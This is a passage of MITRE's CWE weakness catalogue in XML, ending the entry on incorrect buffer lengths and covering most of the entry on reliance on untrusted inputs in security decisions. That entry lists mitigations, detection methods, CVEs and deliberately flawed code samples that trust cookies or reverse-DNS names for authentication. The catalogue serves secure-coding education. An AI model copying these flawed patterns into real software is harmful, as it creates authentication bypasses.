               <Observed_Example_Description>Language interpreter API function doesn't validate
						length argument, leading to information
						exposure</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <Affected_Resources>
            <Affected_Resource>Memory</Affected_Resource>
         </Affected_Resources>
         <References>
            <Reference Reference_ID="REF-11" Local_Reference_ID="R.805.1">
               <Reference_Author>M. Howard</Reference_Author>
               <Reference_Author>D. LeBlanc</Reference_Author>
               <Reference_Title>Writing Secure Code</Reference_Title>
               <Reference_Section>Chapter 6, "Why ACLs Are Important" Page
						171</Reference_Section>
               <Reference_Edition>2nd Edition</Reference_Edition>
               <Reference_Publisher>Microsoft</Reference_Publisher>
               <Reference_PubDate>2002</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-22" Local_Reference_ID="R.805.2">
               <Reference_Author>Michael Howard</Reference_Author>
               <Reference_Title>Address Space Layout Randomization in Windows
						Vista</Reference_Title>
               <Reference_Link>http://blogs.msdn.com/michael_howard/archive/2006/05/26/address-space-layout-randomization-in-windows-vista.aspx</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.805.3">
               <Reference_Author>Arjan van de Ven</Reference_Author>
               <Reference_Title>Limiting buffer overflows with ExecShield</Reference_Title>
               <Reference_Link>http://www.redhat.com/magazine/009jul05/features/execshield/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-29" Local_Reference_ID="R.805.4">
               <Reference_Title>PaX</Reference_Title>
               <Reference_Link>http://en.wikipedia.org/wiki/PaX</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.805.5">
               <Reference_Author>Jason Lam</Reference_Author>
               <Reference_Title>Top 25 Series - Rank 12 - Buffer Access with Incorrect Length
						Value</Reference_Title>
               <Reference_Publisher>SANS Software Security Institute</Reference_Publisher>
               <Reference_Date>2010-03-11</Reference_Date>
               <Reference_Link>http://blogs.sans.org/appsecstreetfighter/2010/03/11/top-25-series-rank-12-buffer-access-with-incorrect-length-value/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-26" Local_Reference_ID="R.805.6">
               <Reference_Author>Matt Messier</Reference_Author>
               <Reference_Author>John Viega</Reference_Author>
               <Reference_Title>Safe C String Library v1.0.3</Reference_Title>
               <Reference_Link>http://www.zork.org/safestr/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-27" Local_Reference_ID="R.805.7">
               <Reference_Author>Microsoft</Reference_Author>
               <Reference_Title>Using the Strsafe.h Functions</Reference_Title>
               <Reference_Link>http://msdn.microsoft.com/en-us/library/ms647466.aspx</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-25" Local_Reference_ID="R.805.8">
               <Reference_Author>Microsoft</Reference_Author>
               <Reference_Title>Understanding DEP as a mitigation technology part
						1</Reference_Title>
               <Reference_Link>http://blogs.technet.com/b/srd/archive/2009/06/12/understanding-dep-as-a-mitigation-technology-part-1.aspx</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-31" Local_Reference_ID="R.805.9">
               <Reference_Author>Sean Barnum</Reference_Author>
               <Reference_Author>Michael Gegick</Reference_Author>
               <Reference_Title>Least Privilege</Reference_Title>
               <Reference_PubDate>2005-09-14</Reference_PubDate>
               <Reference_Link>https://buildsecurityin.us-cert.gov/daisy/bsi/articles/knowledge/principles/351.html</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-37" Local_Reference_ID="R.805.10">
               <Reference_Author>Grant Murphy</Reference_Author>
               <Reference_Title>Position Independent Executables (PIE)</Reference_Title>
               <Reference_Publisher>Red Hat</Reference_Publisher>
               <Reference_Date>2012-11-28</Reference_Date>
               <Reference_Link>https://securityblog.redhat.com/2012/11/28/position-independent-executables-pie/</Reference_Link>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Guarantee that copies are made into storage of sufficient
						size</Mapped_Node_Name>
               <Mapped_Node_ID>ARR33-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Guarantee that copies are made into storage of sufficient
						size</Mapped_Node_Name>
               <Mapped_Node_ID>ARR33-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>100</CAPEC_ID>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission Submission_Source="Internal_CWE_Team">
               <Submitter_Organization>MITRE</Submitter_Organization>
               <Submission_Date>2010-01-15</Submission_Date>
            </Submission>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Potential_Mitigations,
						References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Observed_Examples,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations,
						References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
         </Content_History>
      </Weakness>
                    <Weakness ID="807" Name="Reliance on Untrusted Inputs in a Security Decision" Weakness_Abstraction="Base" Status="Incomplete">
         <Description>
            <Description_Summary>The application uses a protection mechanism that relies on the
					existence or values of an input, but the input can be modified by an untrusted
					actor in a way that bypasses the protection mechanism.</Description_Summary>
            <Extended_Description>
               <Text> Developers may assume that inputs such as cookies, environment variables,
						and hidden form fields cannot be modified. However, an attacker could change
						these inputs using customized clients or other attacks. This change might
						not be detected. When security decisions such as authentication and
						authorization are made based on the values of these inputs, attackers can
						bypass the security of the software.</Text>
               <Text>Without sufficient encryption, integrity checking, or other mechanism, any
						input that originates from an outsider cannot be trusted.</Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>866</Relationship_Target_ID>
               <!--2011 Top 25 - Porous Defenses--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>803</Relationship_Target_ID>
               <!--2010 Top 25 - Porous Defenses--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>693</Relationship_Target_ID>
               <!--Protection Mechanism Failure--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>254</Relationship_Target_ID>
               <!--Security Features--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>878</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 10 - Environment (ENV)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">844</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>859</Relationship_Target_ID>
               <!--CERT Java Secure Coding Section 14 - Platform Security (SEC)--></Relationship>
         </Relationships>
         <Applicable_Platforms>
            <Languages>
               <Language_Class Language_Class_Description="Language-independent"/>
            </Languages>
         </Applicable_Platforms>
         <Time_of_Introduction>
            <Introductory_Phase>Architecture and Design</Introductory_Phase>
            <Introductory_Phase>Implementation</Introductory_Phase>
         </Time_of_Introduction>
         <Likelihood_of_Exploit>Medium to High</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Scope>Access_Control</Consequence_Scope>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Scope>Other</Consequence_Scope>
               <Consequence_Technical_Impact>Bypass protection
						mechanism</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Gain privileges / assume
						identity</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Varies by context</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>Attackers can bypass the security decision to access whatever is being
							protected. The consequences will depend on the associated functionality,
							but they can range from granting additional privileges to untrusted
							users to bypassing important security checks. Ultimately, this weakness
							may lead to exposure or modification of sensitive data, system crash, or
							execution of arbitrary code.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-10">
               <Method_Name>Manual Static Analysis</Method_Name>
               <Method_Description>
                  <Text>Since this weakness does not typically appear frequently within a
							single software package, manual white box techniques may be able to
							provide sufficient code coverage and reduction of false positives if all
							potentially-vulnerable operations can be assessed within limited time
							constraints.</Text>
               </Method_Description>
               <Method_Effectiveness>High</Method_Effectiveness>
               <Method_Effectiveness_Notes>
                  <Text>The effectiveness and speed of manual analysis will be reduced if the
							there is not a centralized security mechanism, and the security logic is
							widely distributed throughout the software.</Text>
               </Method_Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Bytecode Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                        <Text>Binary Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Binary / Bytecode disassembler - then use manual analysis for
									vulnerabilities &amp; anomalies</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with automated results
						interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Web Application Scanner</Text>
                        <Text>Web Services Scanner</Text>
                        <Text>Database Scanners</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with manual results interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Fuzz Tester</Text>
                        <Text>Framework-based Fuzzer</Text>
                        <Text>Monitored Virtual Environment - run potentially malicious code
									in sandbox / wrapper / virtual machine, see if it does anything
									suspicious</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Manual Source Code Review (not inspections)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Source code Weakness Analyzer</Text>
                        <Text>Context-configured Source Code Weakness Analyzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Architecture / Design Review</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Inspection (IEEE 1028 standard) (can apply to requirements,
									design, source code, etc.)</Text>
                        <Text>Formal Methods / Correct-By-Construction</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Attack Modeling</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-14">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Identify and Reduce Attack Surface</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Store state information and sensitive data on the server side only. </Text>
                  <Text>Ensure that the system definitively and unambiguously keeps track of
							its own state and user state and has rules defined for legitimate state
							transitions. Do not allow any application user to affect state directly
							in any way other than through legitimate actions leading to state
							transitions.</Text>
                  <Text>If information must be stored on the client, do not do so without
							encryption and integrity checking, or otherwise having a mechanism on
							the server side to catch tampering. Use a message authentication code
							(MAC) algorithm, such as Hash Message Authentication Code (HMAC)
							[R.807.2]. Apply this against the state or sensitive data that you has
							to be exposed, which can guarantee the integrity of the data - i.e.,
							that the data has not been modified. Ensure that a strong hash function
							is used (CWE-328).</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.2">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Libraries or Frameworks</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use a vetted library or framework that does not allow this weakness to
							occur or provides constructs that make this weakness easier to
							avoid.</Text>
                  <Text>With a stateless protocol such as HTTP, use a framework that maintains
							the state for you.</Text>
                  <Text>Examples include ASP.NET View State [R.807.3] and the OWASP ESAPI
							Session Management feature [R.807.4].</Text>
                  <Text>Be careful of language features that provide state support, since
							these might be provided as a convenience to the programmer and may not
							be considering security.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>For any security checks that are performed on the client side, ensure
							that these checks are duplicated on the server side, in order to avoid
							CWE-602. Attackers can bypass the client-side checks by modifying values
							after the checks have been performed, or by changing the client to
							remove the client-side checks entirely. Then, these modified values
							would be submitted to the server.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-16">
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Environment Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>When using PHP, configure the application so that it does not use
							register_globals. During implementation, develop the application so that
							it does not rely on this feature, but be wary of implementing a
							register_globals emulation that is subject to weaknesses such as CWE-95,
							CWE-621, and similar issues.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-6">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Identify and Reduce Attack Surface</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Understand all the potential areas where untrusted inputs can enter
							your software: parameters or arguments, cookies, anything read from the
							network, environment variables, reverse DNS lookups, query results,
							request headers, URL components, e-mail, files, filenames, databases,
							and any external systems that provide data to the application. Remember
							that such inputs may be obtained indirectly through API calls.</Text>
                  <Text>Identify all inputs that are used for security decisions and determine
							if you can modify the design so that you do not have to rely on
							submitted inputs at all. For example, you may be able to keep critical
							information about the user's session on the server side instead of
							recording it within external data.</Text>
               </Mitigation_Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-15">
               <Intro_Text>The following code excerpt reads a value from a browser cookie to
						determine the role of the user.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>Cookie[] cookies = request.getCookies();</Code>
                     <Code>for (int i =0; i&lt; cookies.length; i++) {</Code>
                     <Block>
                        <Code>Cookie c = cookies[i];</Code>
                        <Code>if (c.getName().equals("role")) {</Code>
                        <Block>
                           <Code>userRole = c.getValue();</Code>
                        </Block>
                        <Code>}</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-16">
               <Intro_Text>The following code could be for a medical records application. It
						performs authentication by checking if a cookie has been set.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>PHP</Code_Example_Language>
                     <Code>$auth = $_COOKIES['authenticated'];</Code>
                     <Code>if (! $auth) {</Code>
                     <Block>
                        <Code>if (AuthenticateUser($_POST['user'], $_POST['password']) ==
									"success") {</Code>
                        <Block>
                           <Code>// save the cookie to send out in future responses</Code>
                           <Code>setcookie("authenticated", "1", time()+60*60*2);</Code>
                        </Block>
                        <Code>}</Code>
                        <Code>else {</Code>
                        <Block>
                           <Code>ShowLoginScreen();</Code>
                           <Code>die("\n");</Code>
                        </Block>
                        <Code>}</Code>
                     </Block>
                     <Code>}</Code>
                     <Code>DisplayMedicalHistory($_POST['patient_ID']);</Code>
                  </Block>
                  <Text>The programmer expects that the AuthenticateUser() check will always
							be applied, and the "authenticated" cookie will only be set when
							authentication succeeds. The programmer even diligently specifies a
							2-hour expiration for the cookie.</Text>
                  <Text>However, the attacker can set the "authenticated" cookie to a non-zero
							value such as 1. As a result, the $auth variable is 1, and the
							AuthenticateUser() check is not even performed. The attacker has
							bypassed the authentication.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-17">
               <Intro_Text>In the following example, an authentication flag is read from a
						browser cookie, thus allowing for external control of user state
						data.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>Cookie[] cookies = request.getCookies();</Code>
                     <Code>for (int i =0; i&lt; cookies.length; i++) {</Code>
                     <Block>
                        <Code>Cookie c = cookies[i];</Code>
                        <Code>if (c.getName().equals("authenticated") &amp;&amp;
									Boolean.TRUE.equals(c.getValue())) {</Code>
                        <Block>
                           <Code>authenticated = true;</Code>
                        </Block>
                        <Code>}</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-93">
               <Intro_Text>The following code samples use a DNS lookup in order to decide
						whether or not an inbound request is from a trusted host. If an attacker can
						poison the DNS cache, they can gain trusted status.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>struct hostent *hp;struct in_addr myaddr;</Code>
                     <Code>char* tHost = "trustme.example.com";</Code>
                     <Code>myaddr.s_addr=inet_addr(ip_addr_string);</Code>
                     <Code/>
                     <Code>hp = gethostbyaddr((char *) &amp;myaddr, sizeof(struct
								in_addr), AF_INET);</Code>
                     <Code>if (hp &amp;&amp; !strncmp(hp-&gt;h_name, tHost,
								sizeof(tHost))) {</Code>
                     <Block>
                        <Code>trusted = true;</Code>
                     </Block>
                     <Code>} else {</Code>
                     <Block>
                        <Code>trusted = false;</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>String ip = request.getRemoteAddr();</Code>
                     <Code>InetAddress addr = InetAddress.getByName(ip);</Code>
                     <Code>if (addr.getCanonicalHostName().endsWith("trustme.com")) {</Code>
                     <Block>
                        <Code>trusted = true;</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C#</Code_Example_Language>
                     <Code>IPAddress hostIPAddress = IPAddress.Parse(RemoteIpAddress);</Code>
                     <Code>IPHostEntry hostInfo = Dns.GetHostByAddress(hostIPAddress);</Code>
                     <Code>if (hostInfo.HostName.EndsWith("trustme.com")) {</Code>
                     <Block>
                        <Code>trusted = true;</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>IP addresses are more reliable than DNS names, but they can also be
							spoofed. Attackers can easily forge the source IP address of the packets
							they send, but response packets will return to the forged IP address. To
							see the response packets, the attacker has to sniff the traffic between
							the victim machine and the forged IP address. In order to accomplish the
							required sniffing, attackers typically attempt to locate themselves on
							the same subnet as the victim machine. Attackers may be able to
							circumvent this requirement by using source routing, but source routing
							is disabled across much of the Internet today. In summary, IP address
							verification can be a useful part of an authentication scheme, but it
							should not be the single factor required for authentication.</Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-1549</Observed_Example_Reference>
               <Observed_Example_Description>Attacker can bypass authentication by setting a
						cookie to a specific value.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-1619</Observed_Example_Reference>
               <Observed_Example_Description>Attacker can bypass authentication and gain admin
						privileges by setting an "admin" cookie to 1.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-0864</Observed_Example_Reference>
               <Observed_Example_Description>Content management system allows admin privileges
						by setting a "login" cookie to "OK."</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-5784</Observed_Example_Reference>
               <Observed_Example_Description>e-dating application allows admin privileges by
						setting the admin cookie to 1. </Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-6291</Observed_Example_Reference>
               <Observed_Example_Description>Web-based email list manager allows attackers to
						gain admin privileges by setting a login cookie to "admin."
					</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference Local_Reference_ID="R.807.1">
               <Reference_Author>Frank Kim</Reference_Author>
               <Reference_Title>Top 25 Series - Rank 6 - Reliance on Untrusted Inputs in a
						Security Decision</Reference_Title>
               <Reference_Publisher>SANS Software Security Institute</Reference_Publisher>
               <Reference_Date>2010-03-05</Reference_Date>
               <Reference_Link>http://blogs.sans.org/appsecstreetfighter/2010/03/05/top-25-series-rank-6-reliance-on-untrusted-inputs-in-a-security-decision/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-30" Local_Reference_ID="R.807.2">
               <Reference_Title>HMAC</Reference_Title>
               <Reference_Publisher>Wikipedia</Reference_Publisher>
               <Reference_Date>2011-08-18</Reference_Date>
               <Reference_Link>http://en.wikipedia.org/wiki/Hmac</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-28" Local_Reference_ID="R.807.3">
               <Reference_Author>Scott Mitchell</Reference_Author>
               <Reference_Title>Understanding ASP.NET View State</Reference_Title>
               <Reference_Publisher>Microsoft</Reference_Publisher>
               <Reference_Date>2004-05-15</Reference_Date>
               <Reference_Link>http://msdn.microsoft.com/en-us/library/ms972976.aspx</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-21" Local_Reference_ID="R.807.4">
               <Reference_Author>OWASP</Reference_Author>
               <Reference_Title>OWASP Enterprise Security API (ESAPI) Project</Reference_Title>
               <Reference_Link>http://www.owasp.org/index.php/ESAPI</Reference_Link>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Sanitize the environment when invoking external
						programs</Mapped_Node_Name>
               <Mapped_Node_ID>ENV03-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT Java Secure Coding">
               <Mapped_Node_Name>Do not base security checks on untrusted
						sources</Mapped_Node_Name>
               <Mapped_Node_ID>SEC09-J</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission Submission_Source="Internal_CWE_Team">
               <Submitter_Organization>MITRE</Submitter_Organization>
               <Submission_Date>2010-01-18</Submission_Date>
            </Submission>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Potential_Mitigations,
						References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
